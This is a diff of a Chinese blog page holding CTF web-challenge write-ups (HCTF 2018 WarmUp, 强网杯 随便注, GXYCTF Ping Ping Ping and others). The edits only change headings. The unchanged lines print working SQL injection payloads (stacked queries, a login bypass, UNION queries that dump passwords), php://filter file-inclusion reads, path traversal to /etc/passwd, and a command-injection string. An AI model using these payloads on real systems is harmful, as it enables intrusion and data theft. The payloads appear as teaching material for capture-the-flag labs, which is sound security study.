@@ -98,8 +98,8 @@
   
     <div class="article-entry" itemprop="articleBody">
        
-  <a id="more"></a><!-- toc -->
-<h1>[HCTF 2018]WarmUp</h1>
+  <!-- toc -->
+<h1>HCTF 2018 WarmUp</h1>
 <p>要不是我脸皮厚 第一题就能把我劝退 🙂</p>
 <p>右键源代码得到提示</p>
 <p>访问source.php 得到源码</p>
@@ -134,7 +134,7 @@
 <p>需要注意的是，这里之所以可以包含到ffffllllaaaagggg是因为PHP将 source.php%253F/ 视作了一个文件夹，然后 …/ 的用途是返回上级目录</p>
 <p>ffffllllaaaagggg位于根目录下，一般Web服务的文件夹在/var/www/html目录中，再加上source.php?/这个“文件夹”，所以我们总共需要…/四次来返回到根目录  当然你也可以用…/更多次 毕竟是在根目录</p>
 <p>参考:<a target="_blank" rel="noopener" href="https://www.cnblogs.com/yesec/p/12635274.html">https://www.cnblogs.com/yesec/p/12635274.html</a></p>
-<h1>[强网杯 2019]随便注</h1>
+<h1>强网杯 2019随便注</h1>
 <p>单引号试探</p>
 <p><img src="https://img-blog.csdnimg.cn/20210114141920393.png" alt="在这里插入图片描述"></p>
 <p>然后 1’# 成功回显，发现并没有过滤注释符</p>
@@ -174,16 +174,16 @@
 <p>或者</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#39;;SET @sqli&#x3D;concat(char(115,101,108,101,99,116),&#39;* from &#96;1919810931114514&#96;&#39;);PREPARE hacker from @sqli;EXECUTE hacker;#</span><br></pre></td></tr></table></figure>
 <p>参考:<a target="_blank" rel="noopener" href="https://www.jianshu.com/p/6c6a44517dd7">https://www.jianshu.com/p/6c6a44517dd7</a></p>
-<h1>[极客大挑战 2019]EasySQL</h1>
+<h1>极客大挑战 2019 EasySQL</h1>
 <p>测试得到是单引号闭合</p>
 <p>万能密码就能爆出flag</p>
 <p><strong>payload:</strong></p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">uername:-1</span><br><span class="line">password: 1&#39;or 1 &#x3D;1%23</span><br></pre></td></tr></table></figure>
-<h1>[极客大挑战 2019]Havefun</h1>
+<h1>极客大挑战 2019 Havefun</h1>
 <p>查看源码,发现代码</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--</span><br><span class="line">$cat&#x3D;$_GET[&#39;cat&#39;];</span><br><span class="line">echo $cat;</span><br><span class="line">if($cat&#x3D;&#x3D;&#39;dog&#39;)&#123;</span><br><span class="line">echo &#39;Syc&#123;cat_cat_cat_cat&#125;&#39;;&#125;</span><br><span class="line">--&gt;</span><br></pre></td></tr></table></figure>
 <p>原来感觉是命令执行…随便穿了一个dog就出flag了。。。。</p>
-<h1>[SUCTF 2019]EasySQL</h1>
+<h1>SUCTF 2019 EasySQL</h1>
 <p>尝试看看 查询当前数据库名</p>
 <p><img src="https://ae01.alicdn.com/kf/U85c1a3fe2bba44bd97aa4c685f4285d5R.jpg" alt=""></p>
 <p>测试可以发现我们输入数据的位置应该在  select x,x,x from aaaaaa 的 x 位置</p>
@@ -198,13 +198,13 @@ PIPES_AS_CONCAT：将“||”视为字符串的连接操作符而非或运算符
 因此设置之后<code>select 1||flag from Flag</code>就变成了将<code>select 1 from Flag</code>和<code>select flag from Flag</code>的结果拼接到一起了。而且使用字母连接会报错，使用数字连接才会查询出数据。</p>
 <p>本地测试一下:</p>
 <p><img src="https://ae01.alicdn.com/kf/U265bf89c1aa54e8bb93494551df95390F.jpg" alt=""></p>
-<h1>[ACTF2020 新生赛]Include</h1>
+<h1>ACTF2020 新生赛 Include</h1>
 <p>打开题目 tips</p>
 <p>发现地址栏有个file参数 明显的文件包含</p>
 <p>尝试读取  …/…/…/…/…/etc/passwd  ,可以成功</p>
 <p>payload</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;flag.php</span><br></pre></td></tr></table></figure>
-<h1>[极客大挑战 2019]Secret File</h1>
+<h1>极客大挑战 2019 Secret File</h1>
 <p>打开题目右键查看源码</p>
 <p>发现 Archi ve_room.php</p>
 <p>然后 点进去源码又发现action.php</p>
@@ -214,7 +214,7 @@ PIPES_AS_CONCAT：将“||”视为字符串的连接操作符而非或运算符
 <p>伪协议读取得到flag</p>
 <p>payload:</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;flag.php</span><br></pre></td></tr></table></figure>
-<h1>[极客大挑战 2019]LoveSQL</h1>
+<h1>极客大挑战 2019 LoveSQL</h1>
 <p>打开题目 order by发现字段为3</p>
 <p>查表: 有两个</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?username&#x3D;d&amp;password&#x3D;1&#39; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()%23</span><br></pre></td></tr></table></figure>
@@ -227,7 +227,7 @@ PIPES_AS_CONCAT：将“||”视为字符串的连接操作符而非或运算符
 <p>可以用 group_concat</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?username&#x3D;admin&amp;password&#x3D;1&#39; union select 2,2,group_concat(password) from &#96;l0ve1ysq1&#96;%23</span><br></pre></td></tr></table></figure>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">group_concat()函数</span><br><span class="line">1、功能：将group by产生的同一个分组中的值连接起来，返回一个字符串结果。</span><br><span class="line">2、语法：group_concat( [distinct] 要连接的字段 [order by 排序字段 asc&#x2F;desc  ] [separator &#39;分隔符&#39;] )</span><br><span class="line">说明：通过使用distinct可以排除重复值；如果希望对结果中的值进行排序，可以使用order by子句；separator是一个字符串值，缺省为一个逗号。</span><br></pre></td></tr></table></figure>
-<h1>[GXYCTF2019]Ping Ping Ping</h1>
+<h1>GXYCTF2019 Ping Ping Ping</h1>
 <p>打开题目发现是rce</p>
 <p>尝试读取:  没有过滤分号</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?ip&#x3D;127.0.0.1;ls</span><br></pre></td></tr></table></figure>
